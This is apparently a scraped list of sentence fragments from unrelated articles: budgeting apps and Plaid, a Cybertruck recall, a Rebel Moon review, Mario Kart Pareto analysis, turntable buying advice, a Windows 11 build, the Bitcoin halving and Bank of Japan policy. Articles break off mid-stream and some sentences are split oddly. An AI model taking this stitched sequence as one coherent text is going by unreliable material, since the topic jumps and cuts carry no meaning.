" But until it follows through, I can’t recommend Copilot for most people with so many good competitors out there.",
"  Copilot Money for Web and Android!",
"Thanks to the support from our users, and the overwhelming positive reception were seeing from folks migrating from Mint, we can now say that well be building @copilotmoney for Web and Android with a goal to launch in 2024.",
"Well continue to…— Andres Ugarte (@chuga) November 15, 2023",
"  ",
"There are other features that Copilot is missing, which I’ll get into.",
" But it is promising, and one to keep an eye on.",
" It’s just a fast, efficient, well designed app, and Android users will be in for a treat when they’ll finally be able to download it.",
" It makes good use of colors, emoji and graphs to help you understand at a glance how you’re doing on everything from your budgets to your investment performance to your credit card debt over time.",
" In particular, Copilot does a better job than almost any other app of visualizing your recurring monthly expenses.",
"Behind those punchy colors and cutesy emoji, though, is some sophisticated performance.",
" Copilot’s AI-powered “Intelligence” gets smarter as you go at categorizing your expenses.",
" (You can also add your own categories, complete with your choice of emoji.",
") It’s not perfect.",
" Copilot miscategorized some purchases (they all do), but it makes it easier to edit than most.",
" On top of that, the internal search feature is very fast; it starts whittling down results in your transaction history as soon as you begin typing.",
"  Dana Wollman / Engadget",
"Copilot is also unique in offering Amazon and Venmo integrations, allowing you to see transaction details.",
" With Amazon, this requires just signing into your Amazon account via an in-app browser.",
" For Venmo, you have to set up fwd@copilot.",
"money as a forwarding address and then create a filter, wherein emails from venmo@venmo.",
"com are automatically forwarded to fwd@copilot.",
"money.",
" Like Monarch Money, you can also add any property you own and track its value through Zillow, which is integrated with the app.",
"While the app is heavily automated, I still appreciate that Copilot marks new transactions for review.",
" It’s a good way to both weed out fraudulent charges, and also be somewhat intentional about your spending habits.",
"Like Monarch Money, Copilot updated its app to make it easier to connect to banks through networks other than Plaid.",
" As part of the same update, Copilot said it has improved its connections to both American Express and Fidelity which, again, can be a bugbear for some budget tracking apps.",
" In an even more recent update, Copilot added a Mint import option, which other budgeting apps have begun to offer as well.",
"Because the app is relatively new (it launched in early 2020), the company is still catching up to the competition on some table-stakes features.",
" Ugarte told me that his team is almost done building out a detailed cash flow section, which could launch before the end of 2023, but more likely in early 2024.",
" On its website, Copilot also promises a raft of AI-powered features that build on its current “Intelligence” platform, the one that powers its smart expense categorization.",
" These include “smart financial goals,” natural language search, a chat interface, forecasting and benchmarking.",
" That benchmarking, Ugarte tells me, is meant to give people a sense of how they’re doing compared to other Copilot users, on both spending and investment performance.",
" Most of these features should arrive in the new year.",
"Copilot does a couple interesting things for new customers that distinguish it from the competition.",
" There’s a “demo mode” that feels like a game simulator; no need to add your own accounts.",
" The company is also offering two free months with RIPMINT — a more generous introductory offer than most.",
" When it finally does come time to pony up, the $7.",
"92 monthly plan is cheaper than some competing apps, although the $95-a-year-option is in the same ballpark.",
"The best free budgeting app: NerdWallet ",
"  ",
"You may know NerdWallet as a site that offers a mix of personal finance news, explainers and guides.",
" I see it often when I google a financial term I don’t know and sure enough, it’s one of the sites I’m most likely to click on.",
" As it happens, NerdWallet also has the distinction of offering one of the only free budgeting apps I tested.",
" In fact, there is no paid version; nothing is locked behind a paywall.",
" The main catch: There are ads everywhere.",
" To be fair, the free version of Mint was like this, too.",
"Even with the inescapable credit card offers, NerdWallet has a clean, easy-to-understand user interface, which includes both a web and a mobile app.",
" The key metrics that it highlights most prominently are your cash flow, net worth and credit score.",
" (Of note, although Mint itself offered credit score monitoring, most of its rivals do not.",
") I particularly enjoyed the weekly insights, which delve into things like where you spent the most money or how much you paid in fees — and how that compares to the previous month.",
" Because this is NerdWallet, an encyclopedia of financial info, you get some particularly specific category options when setting up your accounts (think: a Roth or non-Roth IRA).",
"  Dana Wollman / Engadget",
"As a budgeting app, NerdWallet is more than serviceable, if a bit basic.",
" Like other apps I tested, you can set up recurring bills.",
" Importantly, it follows the popular 50/30/20 budgeting rule, which has you putting 50% of your budget toward things you need, 30% toward things you want, and the remaining 20% into savings or debt repayments.",
" If this works for you, great — just know that you can’t customize your budget to the same degree as some competing apps.",
" You can’t currently create custom spending categories, though a note inside the dashboard section of the app says “you’ll be able to customize them in the future.",
"” You also can’t move items from the wants column to “needs” or vice versa but “In the future, youll be able to move specific transactions to actively manage what falls into each group.",
"” A NerdWallet spokesperson declined to provide an ETA, though.",
"Lastly, it’s worth noting that NerdWallet had one of the most onerous setup processes of any app I tested.",
" I don’t think this is a dealbreaker, as you’ll only have to do it once and, hopefully, you aren’t setting up six or seven apps in tandem as I was.",
" What made NerdWallet’s onboarding especially tedious is that every time I wanted to add an account, I had to go through a two-factor authentication process to even get past the Plaid splash screen, and that’s not including the 2FA I had set up at each of my banks.",
" This is a security policy on NerdWallet’s end, not Plaid’s, a Plaid spokesperson says.",
"Precisely because NerdWallet is one of the only budget trackers to offer credit score monitoring, it also needs more of your personal info during setup, including your birthday, address, phone number and the last four digits of your social security number.",
" It’s the same with Credit Karma, which also does credit score monitoring.",
"Related to the setup process, I found that NerdWallet was less adept than other apps at automatically detecting my regular income.",
" In my case, it counted a large one-time wire transfer as income, at which point my only other option was to enter my income manually (which is slightly annoying because I would have needed my pay stub handy to double-check my take-home pay).",
"Budgeting apps we also tested ",
"YNAB ",
"  ",
"YNAB is, by its own admission, “different from anything you’ve tried before.",
"” The app, whose name is short for You Need a Budget, promotes a so-called zero-based budgeting system, which forces you to assign a purpose for every dollar you earn.",
" A frequently used analogy is to put each dollar in an envelope; you can always move money from one envelope to another in a pinch.",
" These envelopes can include rent and utilities, along with unforeseen expenses like holiday gifts and the inevitable car repair.",
" The idea is that if you budget a certain amount for the unknowns each month, they won’t feel like they’re sneaking up on you.",
"Importantly, YNAB is only concerned with the money you have in your accounts now.",
" The app does not ask you to provide your take-home income or set up recurring income payments (although there is a way to do this).",
" The money you will make later in the month through your salaried job is not relevant, because YNAB does not engage in forecasting.",
"The app is harder to learn than any other here, and it requires more ongoing effort from the user.",
" And YNAB knows that.",
" Inside both the mobile and web apps are links to videos and other tutorials.",
" Although I never quite got comfortable with the user interface, I did come to appreciate YNAB’s insistence on intentionality.",
" Forcing users to draft a new budget each month and to review each transaction is not necessarily a bad thing.",
" As YNAB says on its website, “Sure, you’ve got pie charts showing that you spent an obscene amount of money in restaurants — but you’ve still spent an obscene amount of money in restaurants.",
"” I can see this approach being useful for people who don’t tend to have a lot of cash in reserve at a given time, or who have spending habits they want to correct (to riff off of YNAB’s own example, ordering Seamless four times a week).",
"My colleague Valentina Palladino, knowing I was working on this guide, penned a respectful rebuttal, explaining why she’s been using YNAB for years.",
" Perhaps, like her, you have major savings goals you want to achieve, whether it’s paying for a wedding or buying a house.",
" I suggest you give her column a read.",
" For me, though, YNAB’s approach feels like overkill.",
"PocketGuard ",
"  ",
"PocketGuard is one of the only reputable free budget trackers I found in my research.",
" Just know it’s far more restricted at the free tier than NerdWallet or Mint.",
" In my testing, I was prompted to pay after I attempted to link more than two bank accounts.",
" So much for free, unless you keep things simple with one cash account and one credit card.",
" When it comes time to upgrade to PocketGuard Plus, you have three options: pay $7.",
"99 a month, $34.",
"99 a year or $79.",
"99 for a one-time lifetime license.",
" That lifetime option is actually one of the few unique selling points for me: I’m sure some people will appreciate paying once and never having to, uh, budget for it again.",
"From the main screen, you’ll see tabs for accounts, insights, transactions and the “Plan,” which is where you see recurring payments stacked on top of what looks like a budget.",
" The main overview screen shows you your net worth, total assets and debts; net income and total spending for the month; upcoming bills; a handy reminder of when your next paycheck lands; any debt payoff plan you have; and any goals.",
"  Dana Wollman / Engadget",
"Like some other apps, including Quicken Simplifi, PocketGuard promotes an “after bills” approach, where you enter all of your recurring bills, and then PocketGuard shows you what’s left, and that’s what you’re supposed to be budgeting: your disposable income.",
" Obviously, other apps have a different philosophy: take into account all of your post-tax income and use it to pay the bills, purchase things you want and maybe even save a little.",
" But in PocketGuard, it’s the “in your pocket” number that’s most prominent.",
" To PocketGuard’s credit, it does a good job visualizing which bills are upcoming and which ones you’ve already paid.",
"PocketGuard has also publicly committed to adding some popular features in early 2024.",
" These include rollover budgeting in January 2024, categorization rules in February and shared household access in March.",
"  Dana Wollman / Engadget",
"Although PocketGuard’s UI is easy enough to understand, it lacks polish.",
" The “accounts” tab is a little busy, and doesn’t show totals for categories like cash or investments.",
" Seemingly small details like weirdly phrased or punctuated copy occasionally make the app feel janky.",
" More than once, it prompted me to update the app when no updates were available.",
" The web version, meanwhile, feels like the mobile app blown up to a larger format and doesn’t take advantage of the extra screen real estate.",
"Of note, although PocketGuard does work with Plaid, its primary bank-connecting platform is actually Finicity.",
" Setting up my accounts through Finicity was mostly a straightforward process.",
" I did encounter one hiccup: Finicity would not connect to my SoFi account.",
" I was able to do it through Plaid, but PocketGuard doesn’t make it easy to access Plaid in the app.",
" The only way, as far as I can tell, is to knowingly search for the name of a bank that isn’t available through Finicity, at which point you get the option to try Plaid instead.",
" Like I said: the experience can be janky.",
"What is Plaid and how does it work?",
"Each of the apps I tested uses the same underlying network, called Plaid, to pull in financial data, so it’s worth explaining in its own section what it is and how it works.",
" Plaid was founded as a fintech startup in 2013 and is today the industry standard in connecting banks with third-party apps.",
" Plaid works with over 12,000 financial institutions across the US, Canada and Europe.",
" Additionally, more than 8,000 third-party apps and services rely on Plaid, the company claims.",
"To be clear, you don’t need a dedicated Plaid app to use it; the technology is baked into a wide array of apps, including the budget trackers I tested for this guide.",
" Once you find the “add an account” option in whichever one you’re using, you’ll see a menu of commonly used banks.",
" There’s also a search field you can use to look yours up directly.",
" Once you find yours, you’ll be prompted to enter your login credentials.",
" If you have two-factor authentication set up, you’ll need to enter a one-time passcode as well.",
"As the middleman, Plaid is a passthrough for information that may include your account balances, transaction history, account type and routing or account number.",
" Plaid uses encryption, and says it has a policy of not selling or renting customer data to other companies.",
" However, I would not be doing my job if I didn’t note that in 2022 Plaid was forced to pay $58 million to consumers in a class action suit for collecting “more financial data than was needed.",
"” As part of the settlement, Plaid was compelled to change some of its business practices.",
"In a statement provided to Engadget, a Plaid spokesperson said the company continues to deny the allegations underpinning the lawsuit and that “the crux of the non-financial terms in the settlement are focused on us accelerating workstreams already underway related to giving people more transparency into Plaid’s role in connecting their accounts, and ensuring that our workstreams around data minimization remain on track.",

" The answer is actually two apps: Quicken Simplifi, my overall top pick, and Copilot Money.",
" For now, I am actively using both apps and still deciding, long-term, which I feel more comfortable with.",

"Tesla is recalling Cybertrucks because their accelerator pedals could get stuckTesla has issued a recall for around 3,878 Cybertruck vehicles, a National Highway Traffic Safety Administration notice has revealed.",
" Apparently, the cover of the truck&#39;s accelerator pedal could get dislodged and trapped by the interior rim.",
" Based on videos going around showing the problem, a faulty accelerator cover could slide up due to excessive lubricant, jamming one end into a crevice while it&#39;s still also attached to the pedal itself.",
" That means the vehicle could get stuck accelerating in full power even after the driver lifts their foot.",
"&nbsp;",
"Tesla said in the notice that it will replace and repair the pedals as needed free of charge.",

"Cybertruck buyers were recently informed that their deliveries had been delayed and were reportedly told that Tesla was going to issue a recall over a problem with the vehicle&#39;s accelerator.",
" It followed an earnings call earlier this month, wherein the company revealed that it experienced its first year-over-year drop in deliveries since 2020.",

" (Their names are Titus and Nemesis, respectively, but those don&#39;t really matter because the characters are paper thin.",
")",
"Full disclosure: I tried writing a review for the first Rebel Moon and just gave up in disgust.",
" It was a shockingly boring epic, so much so that it took me several days to watch without falling asleep.",
" By the end, I was only left with a feeling of dread, knowing that there was still another two hours of Rebel Moon ahead of me.",
"It&#39;s somewhat empty praise, but at least I didn&#39;t fall asleep during The Scargiver.",
" Mostly, that&#39;s due to the film actually having a sense of momentum and a lot more action.",
" You can turn off your brain and enjoy the pretty pictures, much like you could for Snyder&#39;s Sucker Punch, Justice League and Watchmen adaptation.",
" He&#39;s more a stylist than a natural storyteller, but occasionally Snyder&#39;s visuals, such as a baffling montage of our heroes harvesting wheat, can be almost poetic.",
"Netflix",
"It&#39;s just a shame that I didn&#39;t care much about the film&#39;s characters or any aspect of its story.",
" James Gunn&#39;s Guardian&#39;s of the Galaxy trilogy made us fall in love with a band of misfits and screwups, with storylines that directly led to their personal and emotional growth.",
" The crew in Rebel Moon, instead, feel like cardboard cutouts from better movies, and the overall plot feels forced (there&#39;s even setup for another film by the end).",
"&nbsp;",
"Hounsou tries to sell the pathos of Titus with his eyes, but he can only do so much.",
" And while Bae&#39;s warrior woman exudes cool (and has a very compelling flashback), she&#39;s mostly wasted when the action really heats up.",
" Then there&#39;s Jimmy, a robot voiced by Anthony Hopkins, who is briefly introduced in the first film and pops up for a few minutes here to kick butt.",
" Why?",
" It doesn&#39;t matter.",
" Somehow that character is also important enough to serve as the narrator for both Rebel Moon films (but really it seems Snyder just wanted Hopkins&#39; voice adding gravitas).",
"Perhaps the only real saving grace for Rebel Moon: Part 2, much like the first film,&nbsp;is Ed Skrein as the villainous Atticus Noble.",
" As a sadistic baddie, he&#39;s really nothing new, but Skrein&#39;s heightened scenery chomping  makes the character interesting to watch.",
" Where Darth Vader exudes a calm sense of dread, Skrein&#39;s Noble is entertainingly chaotic, like the Joker crossed with Christoph Waltz&#39;s Hans Landa from Inglorious Basterds.",
" He just has a lot of fun being bad — that&#39;s something!",
"Given how popular the first film was (according to Snyder and Netflix, anyway), we&#39;ll likely see more Rebel Moon down the line.",
" Snyder previously said he&#39;d like to do a six-hour director&#39;s cut of both films, and he recently told Radio Times that he&#39;d like to stretch the Rebel Moon series out to four or six films.",

"Finally, someone used Pareto’s economic theories to find the best Mario Kart 8 racerWho hasn’t spent sleepless nights pondering what would happen if we applied Vilfredo Paretos (the early 20th-century Italian economist) theories to Mario, the Mushroom Kingdom’s Italian high-jump champion and part-time elephant cosplayer?",
" Data scientist Antoine Mayerowitz, PhD, tackled that age-old question, and the resulting work provides an objective way to tell us the best Mario Kart 8 racer combinations.",
" Hint: It sure as hell ain’t Koopa Troopa.",
"When you break down the build options (including driver stats and various vehicle details) in Mario Kart 8 Deluxe, there are over 700,000 possible combinations.",

" They can pinpoint the solutions with the most balanced strengths and the fewest trade-offs.",
" Pareto’s work is about efficiency and effectiveness.",

"Even if you decide that speed and acceleration are the most important, you’re still left with imbalances.",
" For example, it’s tempting to go all in on speed (like Bowser or Wario), but they have weak acceleration.",
" However, if you prioritize acceleration instead (such as Baby Mario or Dry Bones), you may be left with quick surges that plateau at a lousy top speed.",
"Meanwhile, some racers are always dominated in the most important stats — meaning their balance of speed and acceleration consistently comes out behind.",
" Koopa is one example of that, so don’t pick him if you care about winning.",
" (But you can absolutely choose him because he has cute bug eyes and a snazzy shell.",
")",
"Nintendo",
"Mayerowitz’s Pareto front analysis lets you narrow your possibilities down to the 14 most efficient.",
" And it turns out the game’s top players were onto something: One of the combinations with the most ideal balance of speed, acceleration and mini-turbo is Cat Peach driving the Teddy Buggy, roller tires and cloud glider — one already favored among Mario Kart 8 competitors.",
"Of course, if that combination isn’t your cup of tea, there are others that allow you to stay within the Pareto front’s optimal range.",
" As Eurogamer points out, Donkey Kong, Wario (my old standby, mostly because he makes me laugh) and Princess Peach are often highlighted as drivers, and you can use Mayerowitz’s data fields to find the best matching vehicles.",
" Keep in mind that others have identical stats, so racers like Villager (female), Inkling Girl and Diddy Kong are separated only by appearances.",
"To find your ideal racer, you can head over to Mayerowitz’s website.",

"                            ",
"                                Vinyl records are doing incredible numbers.",
" Sales of LPs are at their highest level since the 1990s after 16 consecutive years of climbing sales, and it&apos;s no wonder why – vinyl records don&apos;t just sound good, they&apos;re wonderfully visual and tactile things too.",
" As much as we love the best music streaming services, there&apos;s something about selecting a record, putting it on one of the best turntables and putting the needle on the record that&apos;s much more satisfying than clicking an icon on your phone.",
" And you can&apos;t show off a Spotify subscription by placing it prominently on a shelf.",
"If you&apos;ve been thinking about joining the fun but don&apos;t have a turntable, we&apos;re here to help.",
" Whether you&apos;re a budget buyer or want to spend big bucks, here&apos;s how to find the perfect turntable for you this Record Store Day.",
"1.",
" What do you want to spend?",
"You can spend a lot of money on a turntable.",
" Think of a really big number and it&apos;s likely that there are turntables that cost even more than that: some high-end turntables will set you back five figures.",
" But there are lots of very affordable options too, and our current budget pick – the Audio-Technica AT-LP60XBT – is less than $200 / £200 AU$300.",
" So before you set out to read up on spec sheets, features, drive types and more, it&apos;s important to decide how much you&apos;re willing to spend.",
" Don&apos;t forget that the records you&apos;ll be playing can be expensive too.",
" There&apos;s no point having a brilliant turntable if you can&apos;t afford any records to play on it.",
" As a rule of thumb, under $100 / £100 / AU$200 is where you&apos;ll find the most basic turntables; they&apos;re fine, but you may well outgrow them relatively quickly.",
"(Image credit: Audio-Technica )",
"Moving up a bracket, turntables in the $100 / £100 / AU$200 to $400 / £400 / AU$500 range are where you&apos;ll find the best entry-level models and mid-range ones too.",
" There&apos;s lots of choice here, and lots of well-loved brands as well as interesting new manufacturers.",
" And most importantly, the sound quality here will usually be way beyond what the sub-$100 / £100 / AU$200 models can deliver.",
"By all means go beyond $400 / £400 / AU$500 if you can and want to, but you&apos;re in premium territory now.",
" The turntables in this price bracket are wonderful, but they can also be a lot more complex and you don&apos;t need to spend quite so much for your first spins.",
"2.",
" What do you already have?",
"Do you already have an amplifier and the best wireless speakers, or are you starting from scratch?",
" If it&apos;s the latter then you&apos;ll need to also get an amp and speakers, or consider going down the Bluetooth route instead.",
" ",
"(Image credit: Pro-Ject )",
"Some turntables now come with Bluetooth, which enables you to stream wirelessly to hardware such as smart speakers and the best Bluetooth speakers.",
" The sound quality isn&apos;t as good as you&apos;ll get from a decent hi-fi (although the most recent, more premium turntable models with aptX HD sound pretty fantastic) but if you&apos;re short of space, cash or both and already have good quality Bluetooth speakers it&apos;s a very convenient option.",
" It&apos;s also less stuff to move if you&apos;re in accommodation such as student or shared apartments from which you&apos;re likely to relocate in the near future.",
"3.",
" What do you want to play?",
"Turntables usually come with a choice of playback speeds: 45rpm for seven-inch records (singles, EPs and flexi-discs) and 33 and 1/3 rpm for twelve-inch albums.",
" Twelve-inch singles play at 45rpm.",
" The older 78rpm speed is a pretty rare option these days, but if you want to play vintage singles you may need that option too.",
" If your records include some valuable ones or limited edition ones, it may be wise to avoid really cheap turntables.",
" A good turntable requires a lot of careful engineering, especially around the tonearm.",
" That&apos;s the long arm that holds the stylus cartridge, and which moves towards the centre as the record plays.",
" A poor quality or badly designed tonearm or stylus can risk damaging your records.",
" ",
"(Image credit: Pro-Ject)",
"If the tonearm is too heavy, or is weighted in such a way that it applies too much force, that can cause extra wear and tear on the records and on the stylus too.",
" Some wear and tear is inevitable, because putting a needle on a record creates friction, but you don&apos;t want to create more wear than necessary.",
" And if the tonearm is too light or has insufficient force applied, the stylus may skip across the grooves and cause scratches.",
" The key here is what&apos;s called tracking force, which is how much downward pressure the tonearm puts on the stylus when it&apos;s in the groove of the record.",
" Turntables that have a counterweight enable you to adjust that force, which is also really important if you change the stylus cartridge in the future: different cartridges, even from the same manufacturer, often require different tracking force settings.",
" Another protective feature that tends to be missing from really cheap turntables is anti-skate.",
" This applies a slight horizontal pressure to the tonearm; without it the tonearm really wants to skate to the centre of the record as it plays.",
" Without anti-skate it can be harder for the turntable to minimise distortion, wear and deliver good stereo sound.",
" Some turntables&apos; anti-skate system is adjustable via a small knob; others are pre-set.",
"4.",
" Do you want an all-in-one?",
"When it comes to convenience you can&apos;t beat an all-in-one that combines turntable, amp and speakers in a single unit.",
" But what you gain in convenience you might lose in audio quality and you definitely lose in expandability: few all-in-ones have components that you can upgrade in the future, and many are made with comparatively poor quality parts that are likely to limit your audio enjoyment.",
" ",
"(Image credit: Victrola)",
"The most flexible and future-proof system is made from separates where you can upgrade or replace your turntable, your amp or your speakers later on.",
"5.",
" Do you need a phono stage?",
"If you&apos;ll be connecting your turntable to a hi-fi system you&apos;ll need to have what&apos;s called a phono stage either in your amplifier, in your turntable, or as a stand-alone bit of hi-fi hardware between the two.",
" A phono stage amplifies the signal from your records so it&apos;s strong enough for the amplifier to do its thing and send the sound to your speakers.",
" If you&apos;re planning to go without an amplifier and connect directly to a set of powered speakers, you&apos;ll almost certainly need a phono stage in your turntable or to add a stand-alone one.",
" ",
"(Image credit: Paul Stolper Gallary)",
"If you&apos;re planning to only stream from a Bluetooth-enabled turntable you don&apos;t need a phono stage, as there will be one built-in to process the signal before it&apos;s sent to the Bluetooth transmitter.",
"Not sure whether your amplifier has a phono stage?",
" If it has one it will have inputs labelled phono around the back and a matching phono option on its input selector.",
" If your turntable and amplifier both have phono stages, you don&apos;t want to use both of them: that&apos;ll turn the signal up too much and make it distort.",
" Some turntables enable you to turn off the phono stage with a simple switch, but if not you&apos;ll need to connect it to the normal analogue inputs rather than the phono ones.",
" As much as we love distortion in music, doubling up on the phono stage delivers a very wrong kind of distortion that&apos;s really quite unpleasant.",
"6.",
" Are you confident about buying second hand?",
"(Image credit: Cambridge Audio)",
"Second hand turntables can save you a lot of money, and can make previously unaffordable models affordable.",
" There are lots of good ones out there at good prices from people who&apos;ve upgraded their existing systems.",
" But equally, there are lots of bad ones too.",
" If you haven&apos;t owned a turntable before, or don&apos;t feel confident in assessing the quality of a potential second-hand buy, we&apos;d recommend sticking with new: that way you&apos;re getting a warranty and other customer protection.",
"7.",
" Do you want a belt drive or direct drive?",
"(Image credit: Lenco)",
"In order to spin the platter, turntables are either connected to it via a rubber belt – a belt drive – or directly to the platter – direct drive.",
" Many but not all high-end turntables are direct drive.",
"Belt drives tend to be quieter in terms of the mechanical noise they generate but the belts will need replaced from time to time.",
" Direct drive effectively lasts forever, but the downside is that it can produce more vibration.",
" That vibration can be apparent with budget models that lack the advanced engineering of their more expensive direct drive rivals.",
" ",
"8.",
" Do you want your turntable to do everything?",
"(Image credit: Majority)",
"The next choice is whether you want a manual turntable or an automatic one.",
" A manual one requires you to lower the tonearm onto the record when you want to play it and to remove it when you reach the end of the record.",
" An automatic turntable does both of those things for you.",
" It&apos;s like the difference between a manual (stick) car and an automatic one.",
"This one&apos;s really about personal preference (and price: fully automatic turntables are slightly more complex and therefore can cost a bit more), but if you can&apos;t decide then consider semi-automatic: that still requires manual operation but will lift the tonearm and stylus for you at the record&apos;s end.",
"9.",
" Who you gonna call?",
"(Image credit: Victrola)",
"There is an impressive amount of turntable advice out there, much of it very good.",
" We would of course recommend our very own guide to the best turntables, which is regularly updated with expert insight from our resident vinyl fanatics.",
" And there are lots of great blogs as well as plenty of helpful folks on Reddit&apos;s r/turntables and r/budgetaudiophile subreddits too.",

"Microsoft is mulling a change for widgets in Windows 11 that could prove controversial",
"                            ",
"                            ",
"                                Microsoft has deployed a new preview build of Windows 11 to the Canary channel (which is the earliest testing outlet) and it does some work on the widgets panel that could be divisive.",
"This is build 26200 and there’s only a handful of changes applied here, two of which pertain to widgets.",
"The main thrust of innovation here is Microsoft’s new idea to allow developers to send notifications from their widgets to the taskbar button.",
" In other words, when something happens with a widget that you might want to see, it’ll be waving at you from the taskbar to let you know.",
"Of course, not everyone will want their widget button in the taskbar to act in this way, and fortunately, Microsoft has included an option to turn off this behavior.",
"It’s also worth noting that this is a limited rollout to begin with, and indeed, most people won’t see these widget notifications yet – only those in the European Economic Area (EEA) are getting this feature in testing.",
" Of course, that rollout could be made broader down the line, depending on feedback.",
"Another tweak related to this in build 26200 is that Microsoft is changing said widgets button to make the icons on the taskbar clearer.",
"Elsewhere on the taskbar, another icon is changing, this time the energy saver icon which resides in the system tray (on the far right).",
" A few months back this was changed in testing to look different for desktop PCs plugged into a power socket, but now Microsoft has decided to revert it to the old look (a leaf icon).",
"Finally, Microsoft notes that there is an odd known issue with this preview build – and others, in the Dev and Beta channels, too – whereby Copilot is auto-launching itself after the PC is rebooted.",
"The software giant explains this is not related to the automatic launch on boot behavior that has been tested in preview builds before, the rollout of which has now stopped, apparently, since March (though we heard it has been restarted elsewhere).",
"This is a separate glitch, then, and Microsoft says it hopes to have a fix implemented soon.",
" Meanwhile, greater visibility for Copilot is something the company is certainly driving forward with, to no one’s surprise.",
"Analysis: A livelier taskbar won’t be everyone’s preferred beverage",
"Are notifications for widgets intrusive?",
" Well, yes they could certainly be regarded in that way, but as noted, as long as the option is provided to turn them off, it’s not too big a deal.",
" If you want them, you can have them – if not, hit that off switch.",
" Fair enough.",
"Many people likely won’t want their widgets effectively waving their hands at them from the taskbar, whenever something new pops up with a widget in the panel.",
" This taskbar-based hand-waving appears to be a direction Microsoft is exploring in more depth, though.",
" We’ve also recently seen an idea where the Copilot button runs an animation with its icon to draw your attention to the fact that the AI can help with something you’re doing on the desktop.",
"This only relates to copying text or image files currently – again, in testing – but in this case, there’s no way to turn it off.",
"All this could possibly point to a taskbar which is considerably livelier and more animated in the future, perhaps – and again, that’s not something everyone will appreciate.",
"If this is the path we’re going down for the taskbar as we head towards next-gen Windows (which might be Windows 12), hopefully Microsoft will also give Windows users enough granular control over the bar’s highlighting features and animations so they can be dialed back suitably.",

" The mechanism is built into the code of Bitcoin to reduce the rate at which new bitcoins are generated.",
" Since Bitcoin aims for a block generation time of 10 minutes, the halving events are roughly spaced four years apart.",

" Desks suggest the halving will occur between April 19-21st.",
" The Block estimates April 20th at around 13:00 ET/18:00 BST, as things stand.",
" Historically, halvings precede periods of price increases due to the anticipated reduction in new bitcoin supply.",
" However, each halving occurs under unique market conditions.",
" Factors surrounding this cycle include 1) the fact BTC hit fresh ATHs earlier this year - which led to speculation that the market may have already priced in the halvings effects, a diversion from the pattern observed in prior halving cycles where significant price action occurred post-halving.",

" Despite the exit from the ultra-loose policy framework, the central bank noted that it expects to maintain an accommodative monetary environment for the time being and Governor Ueda also said during the post-meeting press conference that they will consider options for easing broadly including ones used in the past if needed but kept future hikes on the table with the pace of further hikes to depend on the economy and price outlooks.",
" The rhetoric from the central bank since then suggests a lack of urgency for any immediate adjustment as Governor Ueda stated it is important to maintain accommodative monetary conditions with trend inflation yet to hit 2% and that even after the March policy shift, interest rates are expected to stay low with real interest rates to remain in deeply negative territory, while he noted they will likely gradually shrink the balance sheet as they end their massive stimulus and at some point reduce JGB purchases but had no clear idea on the timing of reducing JGB buying and scaling back the size of the balance sheet.",
" Furthermore, he said they are not immediately thinking of selling the BoJs ETF holdings and will take plenty of time to examine how to reduce BoJs ETF holdings, while there is also no plan to sell their JREIT holdings anytime soon.",
" This suggests the central bank will likely remain patient and refrain from any further adjustments in the near term, although participants will be looking out for any clues of the central bank’s future policy intentions and its tolerance regarding the recent currency depreciation after the yen slid to its weakest level in 34 years against the dollar.",
" As such, Governor Ueda previously stated that they wont change monetary policy just to deal directly with FX moves but suggested they may need to respond with monetary policy if FX moves have an impact on the economy and prices in a way that is hard to ignore and if FX moves lead not just to rising import prices, but risk pushing up trend inflation more than expected.",
" In terms of the Outlook Report, a recent source report stated the BoJ will discuss raising the forecast for fiscal 2024 on the back of a rise in crude prices and higher costs of imported materials due to a weaker yen, while the central bank is said to forecast an increase of about 2% in Core CPI for fiscal 2026 with projections to reflect changes in behaviour over businesses’ wage hikes and price setting, although sources also noted that while the central bank is expected to project inflation to stay around its 2% target through early 2027, such forecasts alone wont serve as strong hints of a near-term rate hike.",
